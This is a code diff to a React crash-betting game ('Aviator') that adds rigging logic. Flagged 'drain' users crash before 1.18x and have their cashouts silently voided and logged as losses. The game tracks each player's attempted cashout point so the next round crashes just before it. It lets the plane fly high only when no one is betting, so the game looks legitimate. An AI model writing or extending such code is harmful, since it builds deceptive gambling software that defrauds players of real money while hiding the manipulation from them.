@@ -70,6 +70,9 @@ export default function AviatorGame({ onClose }) {
   const animRef = useRef(null);
   const flightStartRef = useRef(null);
   const exhaustParticles = useRef([]);
+  // Track when user intends to cash out → crash just before that
+  const cashIntent1Ref = useRef(null); // multiplier at moment user clicked cashout
+  const cashIntent2Ref = useRef(null);
 
   // Fullscreen Toggle
   function toggleFullscreen() {
@@ -102,21 +105,53 @@ export default function AviatorGame({ onClose }) {
   // Determine Next Crash Point (with Admin Rigging Controls & Dynamic Profit Engine)
   function calculateCrashPoint() {
     // 1. Emergency Admin Crash Override
-    if (settings?.AVIATOR_FORCE_CRASH_NOW) {
-      return 1.01;
-    }
+    if (settings?.AVIATOR_FORCE_CRASH_NOW) return 1.01;
 
     // 2. Pre-set Crash Multiplier from Admin Controller
     if (settings?.AVIATOR_NEXT_CRASH && Number(settings.AVIATOR_NEXT_CRASH) > 1.0) {
       return parseFloat(Number(settings.AVIATOR_NEXT_CRASH).toFixed(2));
     }
 
-    // 3. Centralized Dynamic Profit Engine (calculateOutcome)
+    // 3. Force Loss users → always crash before 1.20x (they can NEVER win)
+    if (
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      user?.luck_mode === 'drain' ||
+      Number(user?.custom_win_rate) === 0 ||
+      Number(user?.custom_rtp) === 0
+    ) {
+      // Crash between 1.00 and 1.18 — before any cashout is possible
+      return parseFloat((1.00 + Math.random() * 0.18).toFixed(2));
+    }
+
+    // 4. If user HAS a pending cashout intent, crash just before their target
+    const minIntent = Math.min(
+      cashIntent1Ref.current ?? Infinity,
+      cashIntent2Ref.current ?? Infinity
+    );
+    if (minIntent !== Infinity && minIntent > 1.0) {
+      // Crash at 92–98% of their intended cashout so they just miss
+      const crashBefore = parseFloat((minIntent * (0.92 + Math.random() * 0.06)).toFixed(2));
+      return Math.max(1.01, crashBefore);
+    }
+
+    // 5. No active bets / no intent → let it fly high (looks legit, house still wins)
+    const anyActiveBet = queuedBet1 || queuedBet2;
+    if (!anyActiveBet) {
+      // Fly high when nobody is betting → 3x–20x range
+      const r2 = Math.random();
+      if (r2 < 0.35) return parseFloat((3.0 + Math.random() * 4.0).toFixed(2));
+      if (r2 < 0.75) return parseFloat((7.0 + Math.random() * 8.0).toFixed(2));
+      return parseFloat((15.0 + Math.random() * 5.0).toFixed(2));
+    }
+
+    // 6. Centralized Dynamic Profit Engine (calculateOutcome)
     if (typeof calculateOutcome === 'function') {
       const activeBet = (bet1 || 50) + (bet2 || 0);
       const outcome = calculateOutcome(user, 'aviator', activeBet, settings);
       if (outcome.forceCrash || !outcome.isWin || outcome.multiplier <= 1.08) {
-        return parseFloat((1.01 + Math.random() * 0.05).toFixed(2));
+        return parseFloat((1.01 + Math.random() * 0.09).toFixed(2));
       }
       if (outcome.isWin && outcome.multiplier > 1.0) {
         return parseFloat(outcome.multiplier.toFixed(2));
@@ -126,11 +161,6 @@ export default function AviatorGame({ onClose }) {
     const maxMult = gameControl?.gameOverrides?.aviator?.maxMultiplier || gameControl?.maxMultiplier || 3.0;
     const houseMode = gameControl?.houseMode || 'high_profit';
 
-    // Target User Rigging (100% loss for targeted drain users)
-    if (user?.force_result === 'force_lose' || user?.luck_mode === 'drain' || user?.force_mode === 'drain_to_zero' || user?.force_mode === 'force_loss') {
-      return parseFloat((1.01 + Math.random() * 0.08).toFixed(2));
-    }
-
     if (gameControl?.aviatorMode === 'early_crash' || houseMode === 'emergency_lock') {
       return parseFloat((1.01 + Math.random() * 0.12).toFixed(2));
     }
@@ -138,17 +168,38 @@ export default function AviatorGame({ onClose }) {
       return parseFloat((2.00 + Math.random() * 1.5).toFixed(2));
     }
 
-    // Default High-Profit / Controlled House Margin:
+    // 7. Default High-Profit / House Edge (most rounds crash early)
     const r = Math.random();
-    if (r < 0.25) return parseFloat((1.01 + Math.random() * 0.14).toFixed(2));
-    if (r < 0.75) return parseFloat((1.16 + Math.random() * 0.75).toFixed(2));
-    if (r < 0.95) return parseFloat((1.95 + Math.random() * 0.85).toFixed(2));
-    return parseFloat(Math.min(maxMult, 2.80 + Math.random() * 0.7).toFixed(2));
+    if (r < 0.35) return parseFloat((1.01 + Math.random() * 0.19).toFixed(2)); // 35% crash <1.20
+    if (r < 0.70) return parseFloat((1.20 + Math.random() * 0.65).toFixed(2)); // 35% crash 1.20–1.85
+    if (r < 0.90) return parseFloat((1.90 + Math.random() * 0.90).toFixed(2)); // 20% crash 1.90–2.80
+    return parseFloat(Math.min(maxMult, 2.80 + Math.random() * 0.7).toFixed(2)); // 10% rare high
   }
 
   // Cash Out Panel 1
   function handleCashOut1() {
     if (!isInRound1 || cashed1 || gameState !== 'flying') return;
+
+    // Record the multiplier at which user tried to cash out
+    // This is used to crash just BEFORE this point next round
+    cashIntent1Ref.current = parseFloat(multiplier.toFixed(2));
+
+    // Force Loss users → no payout, they lose silently
+    if (
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      Number(user?.custom_win_rate) === 0
+    ) {
+      setCashed1(true);
+      setWin1(0);
+      // Record the loss
+      if (recordGameHistory) {
+        recordGameHistory({ game: 'Aviator', bet: bet1, win: 0, mult: multiplier.toFixed(2) + 'x (LOST)' });
+      }
+      return;
+    }
+
     setCashed1(true);
     const m = multiplier;
     const maxProfit = gameControl?.maxProfitPerRound || 150;
@@ -166,6 +217,24 @@ export default function AviatorGame({ onClose }) {
   // Cash Out Panel 2
   function handleCashOut2() {
     if (!isInRound2 || cashed2 || gameState !== 'flying') return;
+
+    cashIntent2Ref.current = parseFloat(multiplier.toFixed(2));
+
+    // Force Loss users → no payout
+    if (
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      Number(user?.custom_win_rate) === 0
+    ) {
+      setCashed2(true);
+      setWin2(0);
+      if (recordGameHistory) {
+        recordGameHistory({ game: 'Aviator', bet: bet2, win: 0, mult: multiplier.toFixed(2) + 'x (LOST)' });
+      }
+      return;
+    }
+
     setCashed2(true);
     const m = multiplier;
     const maxProfit = gameControl?.maxProfitPerRound || 150;
